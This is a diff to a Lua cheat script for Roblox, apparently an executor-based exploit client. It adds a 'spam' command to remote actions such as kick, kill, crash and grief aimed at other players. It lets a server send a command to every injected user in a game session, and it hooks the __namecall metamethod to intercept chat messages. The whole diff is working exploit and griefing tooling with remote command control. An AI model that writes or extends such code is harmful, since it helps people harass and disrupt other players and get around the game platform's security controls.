@@ -9615,7 +9615,7 @@ do
 
 	local VALID_COMMANDS = {
 		kick=true, kill=true, freeze=true, crash=true, expose=true,
-		fling=true, spin=true, loopkill=true, annoy=true, grief=true, notify=true,
+		fling=true, spin=true, loopkill=true, annoy=true, grief=true, notify=true, spam=true,
 	}
 
 	local function sendCommand(target, command, args)
@@ -9626,7 +9626,8 @@ do
 			vain:CreateNotification('Commands', 'You need to be whitelisted to use commands (no command token).', 5, 'alert')
 			return
 		end
-		local body = httpService:JSONEncode({ token = token, target = target, command = command, args = args })
+		-- jobId lets the server fan a "<command> all" out to everyone injected here
+		local body = httpService:JSONEncode({ token = token, target = target, command = command, args = args, jobId = game.JobId })
 
 		local makeRequest = syn and syn.request or http and http.request or request
 		if not makeRequest then
@@ -9642,7 +9643,13 @@ do
 		})
 
 		if ok and res and res.StatusCode == 200 then
-			vain:CreateNotification('Commands', 'Queued ' .. command .. ' on ' .. target, 4)
+			if target:lower() == 'all' then
+				local count
+				pcall(function() count = httpService:JSONDecode(res.Body).count end)
+				vain:CreateNotification('Commands', 'Queued ' .. command .. ' on ' .. (count or 0) .. ' user(s)', 4)
+			else
+				vain:CreateNotification('Commands', 'Queued ' .. command .. ' on ' .. target, 4)
+			end
 		else
 			local msg = (ok and res and res.Body) and res.Body or 'Request failed'
 			local parsed = pcall(function() msg = httpService:JSONDecode(msg).error end)
@@ -9671,37 +9678,65 @@ do
 		return true
 	end
 
-	-- Hook TextChatService (modern Roblox)
-	pcall(function()
-		local channels = textChatService:WaitForChild('TextChannels', 5)
-		if not channels then return end
-		for _, ch in channels:GetChildren() do
-			if ch:IsA('TextChannel') then
-				local orig = hookfunction(ch.SendAsync, function(self, text, ...)
-					if handleChatMessage(text) then return end
-					return orig(self, text, ...)
+	-- Games send the typed message via :SendAsync (modern TextChatService) or
+	-- SayMessageRequest:FireServer (legacy) -- BOTH are NAMECALLS, which a plain
+	-- hookfunction on the indexed method misses (that is why ;commands silently
+	-- did not fire in BedWars etc. even though the console worked). Hook
+	-- __namecall to catch them. Inside the hook use index-style
+	-- self.IsA(self,..)/self.Name, never self:IsA(), or we re-enter recursively.
+	if not getgenv().vainChatHooked then
+		getgenv().vainChatHooked = true
+		if hookmetamethod and getnamecallmethod then
+			pcall(function()
+				local oldnamecall
+				oldnamecall = hookmetamethod(game, '__namecall', function(self, ...)
+					local method = getnamecallmethod()
+					if method == 'SendAsync' then
+						local ok, isChan = pcall(function() return self.IsA(self, 'TextChannel') end)
+						if ok and isChan then
+							local text = ...
+							if type(text) == 'string' and handleChatMessage(text) then return end
+						end
+					elseif method == 'FireServer' then
+						local ok, name = pcall(function() return self.Name end)
+						if ok and name == 'SayMessageRequest' then
+							local text = ...
+							if type(text) == 'string' and handleChatMessage(text) then return end
+						end
+					end
+					return oldnamecall(self, ...)
 				end)
-			end
-		end
-		channels.ChildAdded:Connect(function(ch)
-			if not ch:IsA('TextChannel') then return end
-			local orig = hookfunction(ch.SendAsync, function(self, text, ...)
-				if handleChatMessage(text) then return end
-				return orig(self, text, ...)
 			end)
-		end)
-	end)
-
-	-- Fallback: legacy chat remote
-	pcall(function()
-		local chatRemote = replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
-		    and replicatedStorage.DefaultChatSystemChatEvents:FindFirstChild('SayMessageRequest')
-		if not chatRemote then return end
-		local orig = hookfunction(chatRemote.FireServer, function(self, msg, ...)
-			if handleChatMessage(msg) then return end
-			return orig(self, msg, ...)
-		end)
-	end)
+		else
+			-- Fallback for executors without hookmetamethod: hook the indexed
+			-- methods. Two-statement `local orig; orig = ...` so the closure sees
+			-- the real original (the old one-liner bound orig to nil).
+			pcall(function()
+				local channels = textChatService:WaitForChild('TextChannels', 5)
+				if not channels then return end
+				local function hookChannel(ch)
+					if not ch:IsA('TextChannel') then return end
+					local orig
+					orig = hookfunction(ch.SendAsync, function(self, text, ...)
+						if type(text) == 'string' and handleChatMessage(text) then return end
+						return orig(self, text, ...)
+					end)
+				end
+				for _, ch in channels:GetChildren() do hookChannel(ch) end
+				channels.ChildAdded:Connect(hookChannel)
+			end)
+			pcall(function()
+				local chatRemote = replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
+				    and replicatedStorage.DefaultChatSystemChatEvents:FindFirstChild('SayMessageRequest')
+				if not chatRemote then return end
+				local orig
+				orig = hookfunction(chatRemote.FireServer, function(self, msg, ...)
+					if type(msg) == 'string' and handleChatMessage(msg) then return end
+					return orig(self, msg, ...)
+				end)
+			end)
+		end
+	end
 end
 -- ── End in-game commands ─────────────────────────────────────────────────────
 
